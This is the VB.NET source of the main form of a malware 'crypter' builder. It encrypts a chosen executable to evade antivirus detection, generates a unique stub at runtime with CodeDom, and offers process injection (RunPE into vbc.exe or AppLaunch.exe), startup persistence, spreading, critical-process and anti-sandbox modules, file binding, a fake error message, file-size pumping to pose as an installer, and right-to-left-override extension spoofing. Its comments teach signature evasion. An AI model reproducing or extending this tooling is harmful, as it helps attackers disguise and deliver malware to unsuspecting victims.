Imports System.CodeDom.Compiler
Imports System.Text
Imports System.Runtime.CompilerServices
Imports System.ComponentModel

Public Class Form1
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        With OpenFileDialog1
            .FileName = ""
            .Title = "Select the executable you want to protect..."
            .Filter = "Executable Apps (*.exe)|*.exe"
        End With
        If OpenFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = OpenFileDialog1.FileName
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        With OpenFileDialog2
            .FileName = ""
            .Title = "Select the file you want to bind..."
            .Filter = "Any File (*.*)|*.*"
        End With
        If OpenFileDialog2.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox5.Text = OpenFileDialog2.FileName
        End If
    End Sub

    Private Sub CheckBox7_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox7.CheckedChanged
        If CheckBox7.Checked = True Then
            ComboBox2.Enabled = True
            TextBox4.Enabled = True
        Else
            ComboBox2.Enabled = False
            TextBox4.Enabled = False
        End If
    End Sub

    Private Sub CheckBox8_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox8.CheckedChanged
        If CheckBox8.Checked = True Then
            TextBox5.Enabled = True
            Button2.Enabled = True
        Else
            TextBox5.Enabled = False
            Button2.Enabled = False
        End If
    End Sub

    Private Sub CheckBox9_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox9.CheckedChanged
        If CheckBox9.Checked = True Then
            ComboBox3.Enabled = True
        Else
            ComboBox3.Enabled = False
        End If
    End Sub

    Private Sub CheckBox6_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            TextBox3.Enabled = True
            TextBox6.Enabled = True
        Else
            TextBox3.Enabled = False
            TextBox6.Enabled = False
        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        'Where the magic happens...
        If TextBox1.Text <> "" Then

            With SaveFileDialog1
                .FileName = ""
                .Title = "Select where you want to save the output..."
                .Filter = "Executable File (*.exe)|*.exe"
                .AddExtension = True
            End With
            If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then

                'When I first started working on this crypter I faced a big problem. How could I generate individual unique stubs with the least ammount of
                'code possible. The solution I found, a solution many recent crypters also use, is to use codedom. Codedom is a .net tool that allows you to
                'compile code in real time (pretty cool?). The way this crypter works is: I take the basic source, a one-size-fits-all stub source, and I edit it
                'creating a custom stub with the options the user wants. After that, I save all the code to a big string, called "FinalToCompile" and the only
                'routines that are compiled are the ones the user selects.
                '
                'Why all this work? Thanks to this I can guarantee that the code is the smallest possible and that way you don't have unused functions
                'in your final crypted executable.

                Dim BinderModule As String = My.Resources.BinderModule
                Dim EndSubBase As String = My.Resources.EndSubBase
                Dim FakeErrorMessage As String = My.Resources.FakeErrorMessage
                Dim InjectionModule As String = My.Resources.InjectionModule
                Dim ModuleBase As String = My.Resources.ModuleBase
                Dim ModuleEnd As String = My.Resources.ModuleEnd
                Dim RunPeModule As String = My.Resources.RunPeModule
                Dim AntiSandboxModule As String = My.Resources.AntiSandboxModule
                Dim StartupModule As String = My.Resources.StartupModule
                Dim SpreadModule As String = My.Resources.SpreadModule
                Dim ProcessPersistanceModule As String = My.Resources.ProcessPersistanceModule
                Dim CriticalProcessModule As String = My.Resources.CriticalProcessModule
                Dim EncryptionModule As String = My.Resources.EncryptionModule

                Dim xkey As String = RandomKey(12)

                Dim FinalToCompile As String

                ' Here I am already changing important information on one of the mandatory modules
                ' Injection Routine Data
                If ComboBox1.Text = "Inject into vbc.exe" Then
                    InjectionModule = InjectionModule.Replace("%2%", "C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe")
                ElseIf ComboBox1.Text = "Inject into AppLaunch.exe" Then
                    InjectionModule = InjectionModule.Replace("%2%", "C:\Windows\Microsoft.NET\Framework\v2.0.50727\AppLaunch.exe")
                Else
                    InjectionModule = InjectionModule.Replace("%2%", ComboBox1.Text)
                End If

                InjectionModule = InjectionModule.Replace("%1%", TextBox2.Text)

                'This is an interesting part. Codedom can't compile code with a certain lenght in line. How do I solve this? 
                '
                'I read the file we want to encrypt as bytes, I encode it that way the antivirus wont detect it (basic concept of a crypter) and finally
                'I use the Format4Codedom function to edit the whole string making it ready to be compiled

                InjectionModule = InjectionModule.Replace("%4%", Format4Codedom(encrypt(IO.File.ReadAllBytes(TextBox1.Text), xkey)))

                InjectionModule = InjectionModule.Replace("%6%", xkey)

                If CheckBox6.Checked = True Then
                    FakeErrorMessage = FakeErrorMessage.Replace("%2%", TextBox3.Text)
                    FakeErrorMessage = FakeErrorMessage.Replace("%3%", TextBox6.Text)
                End If

                If CheckBox8.Checked = True Then
                    BinderModule = BinderModule.Replace("%3%", Format4Codedom(IO.File.ReadAllBytes(TextBox5.Text)))
                    BinderModule = BinderModule.Replace("%4%", OpenFileDialog2.SafeFileName)
                Else
                End If


                'Unique Stub Generator - If you ever wondered how some crypters promise fully diferent stubs here is the answer. As you know
                '(or should) you need to declare some variables while programming. The thing is, variables turn into binary code and this binary
                'code once it gets detected by antivirus makes up a digital signature. Like a sequence of bytes that antivirus already know it's nasty
                'Of course an advanced USG engine would also change the order the code is executed and maybe add some misdirected api calls/any thing to
                'make it even more diferent. Since I'm not getting paid this will have to do xD

                'Whenever you are doing this you should code everything first and only replace variables with the %something% in the final stage of
                'developing your source otherwise it will be a big mess.

                'ALSO NOTICE HOW I GENERATE RANDOM STRING WITH DIFERENT LENGHTS! THIS IS TO PREVENT TWO VARIABLES HAVING THE SAME NAME EVEN IF IMPROBABLE

                ModuleBase = ModuleBase.Replace("%1%", RandomKey(7))

                BinderModule = BinderModule.Replace("%1%", RandomKey(1))

                BinderModule = BinderModule.Replace("%2%", RandomKey(2))

                BinderModule = BinderModule.Replace("%5%", RandomKey(3))

                InjectionModule = InjectionModule.Replace("%3%", RandomKey(4))

                InjectionModule = InjectionModule.Replace("%5%", RandomKey(9))

                FakeErrorMessage = FakeErrorMessage.Replace("%1%", RandomKey(5))

                FakeErrorMessage = FakeErrorMessage.Replace("%4%", RandomKey(6))

                'New Keys

                EncryptionModule = EncryptionModule.Replace("%1%", RandomKey(1))

                EncryptionModule = EncryptionModule.Replace("%2%", RandomKey(2))

                EncryptionModule = EncryptionModule.Replace("%3%", RandomKey(3))

                EncryptionModule = EncryptionModule.Replace("%4%", RandomKey(4))

                EncryptionModule = EncryptionModule.Replace("%5%", RandomKey(5))

                EncryptionModule = EncryptionModule.Replace("%6%", RandomKey(6))

                EncryptionModule = EncryptionModule.Replace("%7%", RandomKey(7))

                'Unique Stub Generator End

                FinalToCompile = ModuleBase

                If CheckBox8.Checked = True Then
                    FinalToCompile = FinalToCompile & vbNewLine & BinderModule
                End If

                If CheckBox5.Checked = True Then
                    FinalToCompile = FinalToCompile & vbNewLine & AntiSandboxModule
                End If

                If CheckBox3.Checked = True Then
                    FinalToCompile = FinalToCompile & vbNewLine & StartupModule
                End If

                If CheckBox4.Checked = True Then
                    FinalToCompile = FinalToCompile & vbNewLine & SpreadModule
                End If

                FinalToCompile = FinalToCompile & vbNewLine & InjectionModule

                If CheckBox2.Checked = True Then
                    FinalToCompile = FinalToCompile & vbNewLine & CriticalProcessModule
                End If

                If CheckBox1.Checked = True Then
                    FinalToCompile = FinalToCompile & vbNewLine & ProcessPersistanceModule
                End If

                If CheckBox6.Checked = True Then
                    FinalToCompile = FinalToCompile & vbNewLine & FakeErrorMessage
                End If

                FinalToCompile = FinalToCompile & vbNewLine & EndSubBase & vbNewLine & RunPeModule & vbNewLine & EncryptionModule & vbNewLine & ModuleEnd
                ' 
                ' In case you want to see how the final code looks (possible debug to check if everything is working) you can add this line now

                'IO.File.WriteAllText("C:\Users\Ulisses\Desktop\codigo.txt", FinalToCompile)
                ' 
                'That way you'll have access to the code Codedom will compine
                GenerateExecutable(SaveFileDialog1.FileName, FinalToCompile, TextBox7.Text)
                'Executable crypted and generated, now onto some cool functions

                'This is the file pumper. It is used to increase the size of the final executable. Why you might wonder? Well imagine you are
                'saying the crypted stub is an installer/setup. Would it be congruent that it was so small in size? 
                'Basically it appends null bytes to the final file until we reach the desired size
                If CheckBox7.Checked = True Then
                    Dim PumpTarget As Double = Val(TextBox4.Text)
                    If ComboBox2.Text = "MegaBytes" Then
                        PumpTarget = PumpTarget * 1048576
                    ElseIf ComboBox2.Text = "KiloBytes" Then
                        PumpTarget = PumpTarget * 1024
                    End If
                    Dim FileToPump = IO.File.OpenWrite(SaveFileDialog1.FileName)
                    Dim size = FileToPump.Seek(0, IO.SeekOrigin.[End])
                    While size < PumpTarget
                        FileToPump.WriteByte(0)
                        size += 1
                    End While
                    FileToPump.Close()
                End If
                'File Pump End

                'Ah, the good old extension exploit. This is pretty old code but it also is a pretty old exploit. Check the function for more info
                If CheckBox9.Checked = True Then
                    MsgBox("Extension Spoofer: The right-to-left mark exploit may not work on some machines.", MsgBoxStyle.Information, "Notice")
                    Spoof(SaveFileDialog1.FileName, ComboBox3.Text)
                End If
                MsgBox("File Crypted!", MsgBoxStyle.Information, "Done")
                'End, all done, warn the user and we are out
            End If
        Else
            MsgBox("Select the file you want to protect first!")
        End If
    End Sub
    Public Shared Function encrypt(ByVal message As Byte(), ByVal password As String) As Byte()
        'Simple byte encryption
        Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
        Randomize()
        Dim rand As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim outarr(message.Length) As Byte
        Dim u As Integer
        For i As Integer = 0 To message.Length - 1
            outarr(i) += (message(i) Xor passarr(u)) Xor rand
            If u = password.Length - 1 Then u = 0 Else u = u + 1
        Next
        outarr(message.Length) = 112 Xor rand
        Return outarr
    End Function
    Public Sub Spoof(ByVal file As String, ByVal extension As String)
        'Like I was saying, this is an old exploit so it's not that useful but I though I might as well add it. There is a special
        'character that turn text from left to right to the other way around. So your file gets saved as:
        '
        'Example{SpecialCharacter}3pm.exe which ends up displaying as "Exampleexe.mp3"
        '
        'With the right icon, back in the day this worked wonders. Nowadays, not so much
        Dim b As Byte()
        b = IO.File.ReadAllBytes(file)
        Dim newpath As String
        newpath = FolderBrowserDialog1.SelectedPath & ChrW(8238) & StrReverse(extension) & ".exe"
        MsgBox(newpath)
        IO.File.WriteAllBytes(newpath, b)
    End Sub

    '[THE FOLLOWING FUNCTIONS WEREN'T MADE BY ME. TAKE A GOOD LOOK AND SEE IF YOU CAN UNDERSTAND, THERE IS SOME COOL STRING
    'MANIPULATION RIGHT HERE. ALL CREDITS IN THE CREDITS TAB! (CLICK ON THE VERSION TEXT)

    Public Shared Function Format4Codedom(ByVal input As Byte()) As String ' Codedom has maximum of possible chars per line so we are storing the string in multiple strings
        Dim out As New System.Text.StringBuilder ' Declaring a new StringBuilder to store the output string
        Dim base64data As String = Convert.ToBase64String(input)
        Dim arr As String() = SplitString(base64data, 50000) ' Split the string into parts to fit in the Codedom-lines
        For i As Integer = 0 To arr.Length - 1 ' Looping thought each string in the array
            If i = arr.Length - 1 Then  ' If i equals the highest number
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else 'I is smaller than arr.Length - 1 (i < arr.Length - 1)
                out.Append(Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function
    Private Shared Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
        Dim amount As Long = Math.Ceiling(input.Length / partsize) 'Get Long value of the amount of parts using the formular (Length of Input / Length of Parts)
        Dim out(amount - 1) As String 'Declaring the Array to Return using the amount of Parts to define the size
        Dim currentpos As Long = 0 ' Declaring the Currentposition in the String
        For I As Integer = 0 To amount - 1 ' Looping thought each string in the array
            If I = amount - 1 Then ' If i equals the highest number
                Dim temp((input.Length - currentpos) - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part of the String
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos)) ' Current part is everything left from the string
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
            Else 'I is smaller than amount - 1 (i < amount - 1)
                Dim temp(partsize - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part if the String using the Size of a part (partsize)
                input.CopyTo(currentpos, temp, 0, partsize) ' Copying the current Part to the temp array
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
                currentpos += partsize ' Currentposition is increase to catch the next part in the next "round" of the loop
            End If
        Next
        Return out ' Return the Output String
    End Function
    Public Shared Function GenerateExecutable(ByVal Output As String, ByVal Source As String, ByVal Icon As String)
        On Error Resume Next
        Dim Compiler As ICodeCompiler = (New VBCodeProvider).CreateCompiler()
        Dim Parameters As New CompilerParameters()
        Dim cResults As CompilerResults
        Parameters.GenerateExecutable = True
        Parameters.OutputAssembly = Output
        Parameters.ReferencedAssemblies.Add("System.dll")
        Parameters.ReferencedAssemblies.Add("System.Data.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        Dim Version = New Dictionary(Of String, String)
        Version.Add("CompilerVersion", "v2.0")
        Dim ICO As String = IO.Path.GetTempPath & "\iCompiler.ico"
        If Icon <> "" Then
            IO.File.Copy(Icon, ICO)
            Parameters.CompilerOptions &= " /win32icon:" & ICO
        End If
        Parameters.CompilerOptions &= " /optimize+ /target:winexe"
        cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)
        If cResults.Errors.Count > 0 Then
            For Each CompilerError In cResults.Errors
                MessageBox.Show("Error: " & CompilerError.ErrorText, "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Next
        ElseIf cResults.Errors.Count = 0 Then
        End If
        If Icon <> "" Then : IO.File.Delete(ICO) : End If
    End Function
    'RANDOM TEXT GENERATOR, EASY TO UNDERSTAND
    Public Shared Function RandomKey(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Private Sub Label3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label3.Click
        Form3.Show()
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        MsgBox("Click on the software version for more information.", MsgBoxStyle.Information, "Tip")
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        MsgBox("Module under development... No effect on the output")
    End Sub

    Private Sub CheckBox5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.CheckedChanged
        MsgBox("Module under development... No effect on the output")
    End Sub

    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        MsgBox("Module under development... No effect on the output")
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork

    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        SplashScreen1.Close()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        With OpenFileDialog2
            .FileName = ""
            .Title = "Select your icon..."
            .Filter = "Icon Images (*.ico)|*.ico"
        End With
        If OpenFileDialog2.ShowDialog() = Windows.Forms.DialogResult.OK Then
            TextBox7.Text = OpenFileDialog2.FileName
        End If
    End Sub
End Class
